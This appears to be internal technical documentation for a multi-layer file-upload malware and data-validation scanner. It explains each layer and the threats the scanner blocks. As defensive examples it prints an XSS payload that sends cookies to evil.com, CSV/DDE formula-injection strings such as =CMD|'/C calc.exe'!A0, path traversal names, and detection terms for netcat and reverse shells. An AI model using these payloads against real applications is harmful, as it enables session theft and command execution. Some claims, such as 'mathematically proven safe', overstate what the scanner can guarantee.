**TECHNICAL DOCUMENTATION**

**Data Validation &**

**Malware Detection Service**

8-Layer Defense-in-Depth Security Architecture

Protecting Production Environments from Advanced File-Based Threats

Classification: Internal Technical Reference | Version 1.0 | April 2026

  

# 1\. System Overview

The File Security Analyzer is a production-grade, multi-layered security engine designed to protect data pipelines from the full spectrum of file-based threats. It operates on a Secure-by-Default philosophy: every uploaded file is treated as hostile until it has been mathematically proven safe through a sequential, non-parallelized interrogation pipeline.

| 8Security Layers | 50MBMax File Size | 100xBomb Ratio Limit | 0Trust by Default |
| --- | --- | --- | --- |

## 1.1 Core Design Principles

*   **Fail-Closed Architecture:** If any scanner crashes or the ClamAV daemon goes offline, the system defaults to REJECTED. A file never passes through due to a security layer failure.
*   **Sequential Interrogation:** Checks run in order from cheapest (size/path) to most expensive (deep content scanning), ensuring computational resources are not wasted on obviously malicious files.
*   **No Extension Trust:** File extensions provided by users are never trusted. Binary header bytes (magic numbers) are used to verify actual file type identity.
*   **No Path Trust:** All file paths are normalized using os.path.abspath() to neutralize path traversal attacks before any processing begins.
*   **Zero Sample Bias:** Data validators do not check only the first 10 rows of a file. Every single cell in a multi-gigabyte dataset is streamed and inspected.

## 1.2 Threat Model

This system is designed to defend against the following attacker classes and threat categories:

| Threat Category | Attack Vector | Target Outcome |
| --- | --- | --- |
| Known Malware & Viruses | Trojan files, ransomware, rootkits | System compromise, data encryption |
| Advanced Persistent Threats | Obfuscated shellcode, polymorphic payloads | Long-term access, lateral movement |
| Extension Spoofing | virus.exe renamed to report.csv | Bypass extension-based filters |
| Weaponized Documents | PDFs with embedded JavaScript/macros | Auto-execute on open, remote access |
| XSS / DOM Injection | <script> tags in uploaded text/markdown | Browser compromise, session hijacking |
| CSV / Formula Injection | Cells starting with =, +, -, @ | Excel DDE execution, data exfiltration |
| Decompression Bombs | 1000:1 compressed file ratio | Server RAM exhaustion, DoS |
| Path Traversal | ../../etc/passwd filenames | Overwrite system files, data leak |
| Data Poisoning | Shell commands hidden in data columns | Corrupt ML models, crash databases |

  

# 2\. The 8-Layer Security Pipeline

Every file processed by the system passes through a strict sequential pipeline. The pipeline is designed to eliminate the cheapest threats first, conserving CPU and memory for deeper scans on files that have already cleared basic checks. A REJECT decision at any layer immediately halts processing — the file is never passed downstream.

| INCOMING FILE↓[PRE] Size Check (<50MB) → DoS Shield[PRE] Path Sanitization → Traversal Guard↓ Phase 1: Identity & Signature ↓[L1] Magic Number Scan → libmagic / python-magic[L2] Virus Signature → ClamAV Daemon (mmap)[L3] Pattern Hunting → YARA / Neo23x0 Ruleset↓ Phase 2: Format-Specific Deep Inspection ↓[L4] PDF Heuristics → pdfid (/JS /OpenAction /Launch)[L5] XSS Sanitization → bleach (txt/md/xml)[L6] Data Validation → Streaming row-by-row (csv/json/parquet)[L7] Decompression Bomb → ZStandard ratio monitor↓✅ PASS — FILE CLEARED FOR EXECUTION |
| --- |

  

# 3\. Layer-by-Layer Technical Breakdown

The following sections provide a deep technical analysis of each security layer, including the specific attacks it neutralizes, how the detection logic works, and the implementation details.

## Pre-Flight Checks (Size & Path)

Before any file scanner is invoked, two mandatory checks protect server resources from being consumed by trivially dangerous inputs.

| Pre-Check A — File Size (DoS Shield)Attack Target: Denial of Service (DoS) via oversized files consuming server RAM and CPU.Implementation: os.path.getsize() is called before the file is opened. If the file exceeds 50MB, it is rejected immediately.Why 50MB? Standard production datasets are well within this range. Files exceeding this limit are almost always either malformed, test files, or intentional resource exhaustion attacks. |
| --- |
| Pre-Check B — Path Sanitization (Traversal Guard)Attack Target: Path Traversal — an attacker naming a file ../../etc/passwd to overwrite OS system files.Implementation: os.path.abspath() normalizes the full path, and os.path.basename() strips any directory components from the filename.Effect: A file named ../../../etc/shadow is immediately reduced to just shadow, removing the traversal component before any disk operation occurs. |
| --- |

## Layer 1 — Magic Number Scan (Extension Spoof Detection)

| Component | Status | File Types | Implementation |
| --- | --- | --- | --- |
| python-magic / libmagic | Active (Phase 1) | All file types | magic_scanner.py |

### What Attack Does This Stop?

Extension Spoofing. An attacker renames a Windows executable (virus.exe) to appear as a harmless spreadsheet (invoice.csv) or an image (photo.png). Naive systems that rely solely on the file extension to determine type will open the file, execute the binary, and compromise the server.

### How Does It Work?

Every binary file format begins with a specific sequence of bytes — called a Magic Number or File Signature — that definitively identifies its true type, regardless of its name. The libmagic library (the same engine powering the Linux file command) reads these raw header bytes and returns the actual MIME type.

| File Format | Magic Bytes (Hex) | ASCII Representation |
| --- | --- | --- |
| PNG Image | 89 50 4E 47 | ‰PNG |
| PDF Document | 25 50 44 46 | %PDF |
| Windows Executable (EXE/DLL) | 4D 5A | MZ — immediate rejection |
| ZIP Archive | 50 4B 03 04 | PK |
| ELF Linux Binary | 7F 45 4C 46 | .ELF — immediate rejection |

### Decision Logic

The scanner compares the magic-detected MIME type against the whitelist defined in config.py. If the detected type does not match what is expected for the given extension — or if the detected type is categorically dangerous (executable, script) — the file is rejected with the reason Spoof Detected.

## Layer 2 — ClamAV Virus Signature Scanning

| Component | Status | File Types | Implementation |
| --- | --- | --- | --- |
| ClamAV Daemon (pyclamd) | Active (Phase 1) | All file types | clamav_scanner.py |

### What Attack Does This Stop?

Known Global Malware. This layer targets files that are already catalogued in global threat intelligence databases: trojans, ransomware, worms, rootkits, backdoors, spyware, and every other class of malware for which a cryptographic signature exists.

### How Does It Work?

The system connects to a running ClamAV Daemon process via a Unix Domain Socket — a low-latency inter-process communication channel that avoids expensive TCP network overhead. The file is streamed to the daemon, which compares it against a database of millions of known malware signatures (cryptographic hashes, byte patterns, and heuristic rules).

### Performance Engineering — Memory Mapping (mmap)

A critical performance decision was made to handle large files without loading them entirely into Python's memory heap. The system uses mmap (Memory-Mapped I/O) to stream file data directly from disk to the ClamAV socket. This allows scanning of files up to 100MB+ on servers with limited RAM, as the OS manages page-swapping transparently.

### Fail-Closed Guarantee

If the ClamAV daemon is offline, unavailable, or crashes mid-scan, the scanner does not return a PASS result. It raises an exception that the core orchestrator catches and converts to a REJECTED status. The system can never be bypassed by disabling its dependencies.

## Layer 3 — YARA Pattern Hunting (Advanced Payload Detection)

| Component | Status | File Types | Implementation |
| --- | --- | --- | --- |
| YARA + Neo23x0 Ruleset | Active (Phase 1) | All file types / binary | yara_scanner.py |

### What Attack Does This Stop?

Advanced Persistent Threats (APTs), obfuscated shellcode, and novel malware payloads that ClamAV has not yet catalogued. YARA excels at catching Zero-Day threats and tools used by professional penetration testers and nation-state actors.

### YARA vs ClamAV — A Critical Distinction

ClamAV hunts for known bad files by hash and exact signature. YARA hunts for known bad behaviors by looking for hexadecimal byte patterns associated with attack techniques. This is the difference between recognizing a known criminal by their face versus recognizing that someone is acting like a criminal by their behavior.

| ClamAV (Signature-Based) | YARA (Behavior / Pattern-Based) |
| --- | --- |
| Matches exact file hashes | Matches byte patterns and behavioral indicators |
| Requires prior knowledge of the threat | Can detect novel/unknown variants |
| Very fast — O(1) hash lookup | Slower — pattern scanning across file bytes |
| Ineffective against polymorphic malware | Effective against obfuscated and modified payloads |

### The Neo23x0 Ruleset (Florian Roth)

This system uses the industry-standard Neo23x0 community ruleset, authored and maintained by Florian Roth — one of the foremost malware analysts in the cybersecurity community. These rules are continuously updated and cover:

*   **SUSP\_shellpop\_Bash:** Detects bash reverse shell payloads commonly used to establish remote access after initial compromise.
*   **Generic\_Reverse\_Shell:** Identifies byte patterns from multiple reverse shell frameworks hidden inside binary data.
*   **Obfuscated PowerShell:** Catches base64-encoded or character-substituted PowerShell commands embedded in files.
*   **Webshells:** Identifies PHP, ASP, and JSP backdoor shells commonly uploaded to web servers.
*   **Credential Harvesters:** Patterns from tools like Mimikatz that extract Windows credentials from memory.

### Real-World Detection Example

A suspicious\_test.parquet file was identified during testing. Although it appeared to be a standard data file and passed ClamAV, YARA detected a SUSP\_shellpop\_Bash signature embedded within its binary column data. The hexadecimal byte pattern of a bash reverse shell had been encoded into a data field — invisible to CSV validators, transparent to ClamAV, but immediately caught by YARA's pattern rules.

  

## Layer 4 — PDF Heuristic Inspection (Active Content Detection)

| Component | Status | File Types | Implementation |
| --- | --- | --- | --- |
| pdfid | Active (Phase 2) | .pdf only | pdf_scanner.py |

### What Attack Does This Stop?

Weaponized Document Attacks. A PDF is not just a static document — the PDF specification allows for embedded JavaScript, automatic actions, form submissions, and even the ability to launch external executables. A weaponized PDF can silently execute a payload the moment it is opened in Adobe Reader or a browser PDF viewer.

### How Does It Work?

The pdfid tool parses the internal PDF object dictionary and scans for high-risk object keywords. Standard antivirus often misses these because the file is a valid, structurally correct PDF — it simply contains dangerous capabilities. Our scanner flags and rejects any PDF containing the following tags:

| PDF Tag | Risk Level | Attack Description |
| --- | --- | --- |
| /JS, /JavaScript | Critical | Executes JavaScript when the PDF is opened. Used to exploit PDF reader vulnerabilities or exfiltrate data. |
| /OpenAction | Critical | Triggers an automatic action on open — often used to invoke the /JS payload silently, without user interaction. |
| /AA (Additional Actions) | High | Triggers actions on page-turn, form interaction, or close events — creating persistent or delayed execution opportunities. |
| /Launch | High | Instructs the PDF reader to open and execute an external file (.exe, .bat, .sh). Direct malware dropper mechanism. |
| /AcroForm | Medium | PDF forms can submit data to remote servers without user awareness, enabling silent credential phishing. |
| /RichMedia | Medium | Embeds Flash or 3D objects which have historically contained critical remote code execution vulnerabilities. |

### Why Standard Antivirus Misses This

ClamAV and most consumer antivirus products scan for known malicious file hashes. A freshly generated weaponized PDF with a unique hash will pass ClamAV cleanly. The pdfid layer catches these threats not by what the file IS, but by what the file CAN DO — making it effective against zero-day weaponized documents.

## Layer 5 — XSS Sanitization (DOM Injection Prevention)

| Component | Status | File Types | Implementation |
| --- | --- | --- | --- |
| bleach (allowlist parser) | Active (Phase 2) | .txt, .md, .xml | text_sanitizer.py |

### What Attack Does This Stop?

Cross-Site Scripting (XSS) via uploaded file content. When text, markdown, or XML files are uploaded and subsequently rendered on a web dashboard or admin panel, any embedded HTML tags are interpreted by the browser. An attacker who uploads a markdown file containing <script>document.cookie</script> can steal session tokens from every administrator who views that file.

### How Does It Work?

The bleach library implements an allowlist-based HTML parser. Instead of trying to block known bad tags (a blocklist approach, which is always bypassable), bleach starts by allowing nothing and only permits explicitly whitelisted, safe tags. Any tag not on the allowlist is stripped.

The system applies bleach to the full file content and then compares the sanitized output to the original. If anything was stripped, the file contained injectable content and is rejected — even if the stripped content might seem harmless. This is a zero-tolerance policy for active web content in data files.

### Attack Examples Caught

*   **<script> injection:** <script>fetch("https://evil.com/?c="+document.cookie)</script> — steals session cookies.
*   **<iframe> injection:** <iframe src='https://phishing-site.com'></iframe> — loads malicious external pages.
*   **Event handler injection:** <img src=x onerror='alert(1)'> — executes JS on broken image load, bypassing script tag filters.
*   **CSS injection:** <style>body{background:url(https://evil.com/track.png)}</style> — exfiltrates page visit data.

  

## Layer 6 — Streaming Data Validator (Formula Injection & Data Poisoning)

| Component | Status | File Types | Implementation |
| --- | --- | --- | --- |
| Custom Streaming Iterator | Active (Phase 2) | .csv, .json, .parquet | data_validator.py |

### The Zero-Loophole Guarantee

Most data validators check a sample — the first 10, 100, or 1000 rows of a file. An attacker who knows this embeds their payload in row 50,000. This system uses a streaming iterator that processes every single cell in a file of any size, from the first row to the last, without loading the entire dataset into memory.

### Attack 1: CSV / Formula Injection (DDE Attack)

CSV files are not just data — when opened in Microsoft Excel or LibreOffice Calc, cell values beginning with specific characters are interpreted as formulas or Dynamic Data Exchange (DDE) commands that can execute system commands.

| Trigger Char | Example Payload | Effect |
| --- | --- | --- |
| = | =CMD|'/C calc.exe'!A0 | Executes Windows calculator (proof-of-concept for arbitrary code) |
| + | +cmd|'/C whoami'!A0 | Alternative syntax — executes shell command as formula |
| - | -2+3+cmd|'/C dir'!D2 | Arithmetic prefix to bypass simple = filters |
| @ | @SUM(1+1)*cmd|'/C net user'!A0 | Uses @ function prefix as another bypass vector |

### Attack 2: Command Payload Injection (Data Poisoning)

Data columns may contain strings that are not formula injections but are shell commands intended to be executed by downstream data processing pipelines. If a machine learning pipeline, ETL job, or database import script passes raw string values to a shell, these payloads execute with server privileges.

*   **Shell references:** Strings containing /bin/bash, /bin/sh, cmd.exe, powershell.exe are flagged.
*   **Network tools:** Strings containing netcat, nc -e, ncat indicate reverse shell setup.
*   **Encoded payloads:** Base64 strings of abnormal length within data fields are flagged as potential encoded command payloads.

### Attack 3: Schema Enforcement (DoS by Malformed Data)

A file that claims to be JSON but contains malformed syntax will crash Python's json.loads() parser, raise an unhandled exception, and potentially bring down the processing service. Similarly, a Parquet file with a corrupted schema crashes pandas or Apache Spark readers.

The validator explicitly parses each file with its correct parser before content scanning begins. If parsing fails, the file is rejected as Malformed Structure — preventing crash-based DoS attacks against downstream consumers.

## Layer 7 — Decompression Bomb Defense (ZStandard)

| Component | Status | File Types | Implementation |
| --- | --- | --- | --- |
| ZStandard (zstd) | Active (Phase 2) | .zst compressed files | zst_validator.py |

### What Attack Does This Stop?

Decompression Bomb (also called a Zip Bomb or Billion Laughs Attack). A decompression bomb is a file that appears tiny on disk (e.g., 1MB) but expands to an enormous size when decompressed (e.g., 1TB). When a server attempts to decompress such a file into memory or disk, it exhausts all available RAM, causing the process to crash and taking down the service (Denial of Service).

The classic example is 42.zip: a 42-kilobyte ZIP file that expands to approximately 4.5 petabytes through recursive nested compression. Modern variants use ZStandard compression, which offers even higher compression ratios.

### How Does It Work?

The validator does NOT decompress the file fully before checking its size. Instead, it implements a manual streaming decompression loop that monitors two real-time metrics:

| Metric | Limit | Action on Breach |
| --- | --- | --- |
| Absolute Decompressed Size | > 100MB | Stream is cut immediately. File rejected as Explosion Limit Exceeded. |
| Compression Ratio (uncompressed / compressed) | > 100x | Stream is cut immediately. File rejected as Decompression Bomb Detected. |

### Why Streaming Decompression Is Critical

If the system attempted to decompress the entire file first and then check its size, the bomb would have already detonated — exhausting server memory in the process. The streaming approach checks size incrementally as bytes are decompressed, cutting the stream the moment either threshold is breached, long before any significant memory impact occurs.

  

# 4\. The 4-Level Data Validation Strategy

The security pipeline can also be described as a 4-level progressive trust model that interrogates files at increasing depths of analysis — from superficial metadata through to the semantic meaning of the data itself.

| Level | Name | Goal | Key Defenses |
| --- | --- | --- | --- |
| 1 | Meta-Level Validation | Stop DoS & Traversal before CPU is used | Size check (os.path.getsize), path normalization (abspath/basename) |
| 2 | Structural Validation | Verify file is what it claims to be | Magic number identity (libmagic), syntax parsing (json.loads, pd.read_csv) |
| 3 | Content-Safety Validation | Identify active threats inside valid structures | ClamAV signatures, YARA patterns, pdfid heuristics, bleach XSS stripping |
| 4 | Semantic Validation | Verify meaning and logic of data is safe | Formula injection detection (=, +, -, @), shell string scanning, decompression ratio analysis |

  

# 5\. Fail-Closed Architecture & Production Reliability

## 5.1 The Fail-Closed Principle

In traditional systems, an error in a security component causes it to fail open — the file is passed through because the check couldn't be completed. This system inverts this logic entirely. Every error condition, every exception, every daemon outage results in a REJECTED outcome. Security layers cannot be neutralized by disrupting their dependencies.

| Failure Scenario | Traditional (Fail-Open) | This System (Fail-Closed) |
| --- | --- | --- |
| ClamAV daemon offline | PASS — scan skipped | REJECTED — daemon unavailable |
| YARA rule file missing | PASS — no rules to match | REJECTED — scanner error |
| File causes scanner exception | PASS — exception caught silently | REJECTED — unhandled state |
| Unknown file extension | PASS — no handler registered | REJECTED — not in whitelist |

## 5.2 Extension Whitelist (Drop-by-Default)

The system maintains an explicit allowlist of permitted file extensions in config.py. Any file extension not on this list is immediately dropped — no scanner is invoked, no processing occurs. The system does not attempt to be helpful by guessing at file types; it enforces a strict zero-unknown policy.

This prevents attackers from submitting unusual file types (.php, .exe, .bat, .sh, .vbs, .hta, etc.) that might slip through format-specific scanners not designed to handle them.

## 5.3 Security Report Output

The CLI entry point analyze\_file.py produces a structured security report for every file analyzed. For each layer, the report includes: the layer name, the verdict (PASS / REJECTED), the specific reason for rejection if applicable, and the time taken. For integration into FastAPI or Django backends, the SecurityAnalyzer class can be imported directly and its .analyze(path) method called to receive a structured result object.

  

# 6\. Future Roadmap — Dynamic Detonation & Beyond

The current system represents a world-class static analysis engine. Static analysis examines a file's content at rest. The next maturity frontier is dynamic analysis — observing a file's behavior at runtime.

## 6.1 Level 3 Maturity — Cuckoo Sandbox (Dynamic Detonation)

Polymorphic malware is designed to evade static analysis. It may contain no known virus signatures, no matching YARA patterns, and no suspicious PDF tags — because it does not reveal its true payload until it is actually executed on a live system.

### How Cuckoo Sandbox Works

*   **Controlled Detonation:** Files that pass all static layers are sent to a Cuckoo Sandbox — a fully isolated Virtual Machine (VM) running a real operating system. The file is executed and its behavior is monitored for a defined observation window.
*   **API Hooking:** Cuckoo intercepts all Windows/Linux API calls made by the process. Any attempt to open a network socket, write to disk, modify registry keys, or spawn child processes is logged and analyzed.
*   **Network Monitoring:** If the executed file attempts to connect to a Command-and-Control (C2) server, DNS-resolve an unusual domain, or exfiltrate data over HTTP, it is caught.
*   **Time-Acceleration:** Sophisticated sleep malware waits hours or days before activating. Cuckoo's time-acceleration features compress this wait period, forcing the malware to reveal its payload during the analysis window.

## 6.2 Level 4 Maturity — Content Disarm & Reconstruction (CDR)

Instead of blocking a weaponized PDF, CDR actively disarms it. The system parses the PDF, strips all active content tags (/JS, /OpenAction, /Launch), and reconstructs a clean, content-only PDF that is delivered to the user. The user receives their document; the threat is neutralized without blocking the workflow.

## 6.3 Level 5 Maturity — AI Heuristics for Semantic Threats

Some threats are not mathematical — they are social. A text file containing a well-crafted phishing email, instructions for a financial scam, or code designed to exploit a business logic flaw may pass all static and dynamic checks because it contains no malware. It simply contains harmful intent expressed in natural language or legitimate code.

The next frontier applies Large Language Models (LLMs) as a final semantic analysis layer, evaluating the meaning and intent of textual and code content rather than just its structure and byte patterns.

  

# 7\. Component Reference

| File | Layer | Responsibility |
| --- | --- | --- |
| analyze_file.py | Entry Point | CLI interface, orchestrates SecurityAnalyzer, outputs structured report |
| security_analyzer/core.py | Orchestrator | Multi-layer scan logic, fail-closed error handling, result aggregation |
| security_analyzer/config.py | Configuration | Global size limits, MIME type whitelist, YARA rule paths, API keys |
| scanners/magic_scanner.py | Layer 1 | python-magic / libmagic binary header inspection for MIME spoofing |
| scanners/clamav_scanner.py | Layer 2 | pyclamd daemon connection, mmap streaming, virus signature matching |
| scanners/yara_scanner.py | Layer 3 | Neo23x0 ruleset loading, binary pattern scanning, behavioral detection |
| scanners/pdf_scanner.py | Layer 4 | pdfid internal dictionary scan for /JS, /OpenAction, /Launch, /AA, /AcroForm, /RichMedia |
| scanners/text_sanitizer.py | Layer 5 | bleach allowlist parser for XSS stripping in .txt / .md / .xml files |
| scanners/data_validator.py | Layer 6 | Streaming row-by-row iterator for CSV/JSON/Parquet, formula injection, shell string, schema enforcement |
| scanners/zst_validator.py | Layer 7 | ZStandard streaming decompressor with 100MB size and 100:1 ratio limits |
| test_all.py | Testing | Batch scan runner across all test suite files; validates true/false positive rates |
| generate_test_suite.py | Testing | Generates fresh malicious payload files for regression testing all attack vectors |

  

# 8\. Quick Reference — Attack vs Defense Matrix

| Attack Vector | Attack Technique | Layer(s) Defending | Status |
| --- | --- | --- | --- |
| Extension Spoofing | virus.exe → invoice.csv rename | Layer 1 (Magic Number) | BLOCKED |
| Known Malware | Trojan, ransomware, rootkit file | Layer 2 (ClamAV) | BLOCKED |
| Obfuscated Shellcode | SUSP_shellpop_Bash in parquet binary | Layer 3 (YARA) | BLOCKED |
| Zero-Day Malware | Novel payload, no ClamAV signature | Layer 3 (YARA) | BLOCKED |
| PDF JavaScript | /JS tag executes on PDF open | Layer 4 (pdfid) | BLOCKED |
| PDF Auto-Execute | /OpenAction silent system trigger | Layer 4 (pdfid) | BLOCKED |
| PDF Executable Drop | /Launch opens external .exe file | Layer 4 (pdfid) | BLOCKED |
| XSS via Upload | <script> in uploaded markdown | Layer 5 (bleach) | BLOCKED |
| DOM Injection | <iframe> in uploaded XML | Layer 5 (bleach) | BLOCKED |
| CSV Formula Injection | =CMD|'/C calc.exe'!A0 in cell | Layer 6 (Validator) | BLOCKED |
| DDE Command Execution | +cmd|'/C whoami'!A0 in data | Layer 6 (Validator) | BLOCKED |
| Data Poisoning | /bin/bash string in data column | Layer 6 (Validator) | BLOCKED |
| Schema-Based DoS | Malformed JSON/Parquet crashing parsers | Layer 6 (Validator) | BLOCKED |
| Decompression Bomb | 1000:1 compressed ZST file | Layer 7 (ZST Guard) | BLOCKED |
| Size-Based DoS | 5GB file exhausting server RAM | Pre-Check (Size) | BLOCKED |
| Path Traversal | ../../etc/passwd as filename | Pre-Check (Path) | BLOCKED |
| Unknown Extension | .php, .exe, .hta upload | Whitelist (config.py) | BLOCKED |
| Scanner Disruption | ClamAV daemon killed mid-scan | Fail-Closed Logic | BLOCKED |